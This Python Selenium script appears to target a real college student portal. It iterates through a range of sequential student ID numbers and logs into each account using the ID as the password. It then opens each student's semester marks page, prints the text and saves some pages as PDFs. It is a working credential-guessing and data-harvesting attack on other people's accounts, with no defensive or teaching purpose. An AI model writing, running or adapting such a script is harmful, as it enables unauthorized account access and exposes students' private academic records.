from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.remote.webelement import WebElement
import time
import json
settings = {
    "recentDestinations": [{
        "id": "Save as PDF",
        "origin": "local",
        "account": ""
    }],
    "selectedDestinationId": "Save as PDF",
    "version": 2,
    "isHeaderFooterEnabled": True,
    # "mediaSize": {
    #     "height_microns": 210000,
    #     "name": "ISO_A4",
    #     "width_microns": 148000,
    #     "custom_display_name": "A4"
    # },
    # "customMargins": {},
    # "marginsType": 2,
    # "scaling": 180,
    # "scalingType": 3,
    # "scalingTypePdf": 3,
    "isCssBackgroundEnabled": True
}
options = Options()
options.add_experimental_option("detach", True)
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
driver.get("https://www.lordsautomation.com/Login.aspx")
username = driver.find_element(By.ID, 'txtUserName')
next = driver.find_element(By.ID, 'btnNext')
options.add_argument('--enable-print-browser')
usnm = int(160921733067)
pswd = int(160921733067)
filename = usnm
prefs = {
    'printing.print_preview_sticky_settings.appState': json.dumps(settings),
    'savefile.default_directory': r"D:\My Desktop\Desktop\lrdsmarksuto\selectives"
}
options.add_argument('--kiosk-printing')
options.add_experimental_option('prefs', prefs)

while usnm<=160921733168:
    try:
        usnm += 1 
        pswd += 1   
        time.sleep(5)
        username = driver.find_element(By.ID, 'txtUserName')
        next = driver.find_element(By.ID, 'btnNext')

        username.send_keys(usnm)
        next.click()
        password = driver.find_element(By.ID, 'txtPassword')
        password.send_keys(pswd)
        submit = driver.find_element(By.ID, 'btnSubmit')
        submit.click()
        marks = driver.find_element(By.ID, 'ctl00_cpStud_lnkOverallMarksSemwiseMarks')
        marks.click()
        if(160921733067<usnm<160921733073):
            # driver.maximize_window()
            driver.execute_script('window.print();')
        print(driver.find_element(By.XPATH, "/html/body").text)
        print("\n==========================================================================\n")
        driver.get("https://www.lordsautomation.com/Login.aspx")
        continue
    except:
        usnm-=1
        pswd-=1

        print("\n==========================================================================\n")
        driver.get("https://www.lordsautomation.com/Login.aspx")

        print('crash',usnm,pswd)
        continue

    